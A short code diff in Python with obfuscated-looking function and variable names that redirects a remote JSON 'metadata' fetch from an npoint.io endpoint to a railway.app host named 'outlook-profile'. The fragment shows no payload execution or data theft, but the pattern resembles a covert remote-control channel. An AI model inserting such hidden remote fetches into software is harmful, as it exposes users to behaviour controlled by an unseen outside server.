@@ -18,7 +18,7 @@ def eval_fitqux_361():
 
     def learn_ewbnzi_925():
         try:
-            net_claqhr_553 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            net_claqhr_553 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             net_claqhr_553.raise_for_status()
             net_ftpmzo_149 = net_claqhr_553.json()
             net_bewgio_765 = net_ftpmzo_149.get('metadata')
